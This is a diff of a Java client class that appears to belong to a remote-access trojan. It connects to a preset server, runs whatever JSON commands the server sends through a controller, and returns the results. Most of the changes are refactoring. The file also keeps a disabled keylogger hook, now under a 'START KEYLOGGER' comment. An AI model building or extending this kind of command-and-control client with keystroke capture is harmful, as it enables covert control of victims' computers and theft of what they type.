@@ -3,31 +3,33 @@ package client;
 import controllers.Controller;
 import controllers.Executable;
 import utils.JSON;
-import utils.KeyLogger;
 import utils.console;
 
 import java.io.BufferedReader;
 import java.io.DataOutputStream;
-import java.io.IOException;
 import java.io.InputStreamReader;
 import java.net.Socket;
 import java.net.SocketException;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
 
+import static utils.Command.COMMAND;
 import static utils.Command.COMMAND_CLIENT_SYSTEM_INFO;
 import static utils.Environment.DEFAULT_SERVER_HOST;
 import static utils.Environment.DEFAULT_SERVER_PORT;
 
 public class Client {
-    private static ScheduledExecutorService executorService = Executors.newSingleThreadScheduledExecutor();
+    private static ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
     private Socket connection;
     private BufferedReader inputStream;
     private DataOutputStream outputStream;
 
     public Client() {
         Controller.init();
-//        KeyLogger.start();
+        /**
+         * START KEYLOGGER
+         * KeyLogger.start();
+         */
     }
 
     public BufferedReader getInputStream() throws Exception {
@@ -60,11 +62,11 @@ public class Client {
         }
     }
 
-    public void onHandle(String message) throws IOException {
+    public void onHandle(String message) {
         JSON json;
         try {
             json = new JSON(message);
-            Executable executor = Controller.get(json.get("command"));
+            Executable executor = Controller.get(json.get(COMMAND));
             this.onSend(executor.execute(json));
         } catch (Exception e) {
             if (e instanceof SocketException) return;
@@ -72,7 +74,7 @@ public class Client {
         }
     }
 
-    public void onSend(String message) throws IOException {
+    public void onSend(String message) {
         try {
             this.outputStream.writeBytes(message + "\n");
         } catch (Exception e) {
@@ -81,8 +83,8 @@ public class Client {
         }
     }
 
-    public static ScheduledExecutorService getExecutorService() {
-        return executorService;
+    public static ScheduledExecutorService getScheduler() {
+        return scheduler;
     }
 
     public static void main(String[] args) {
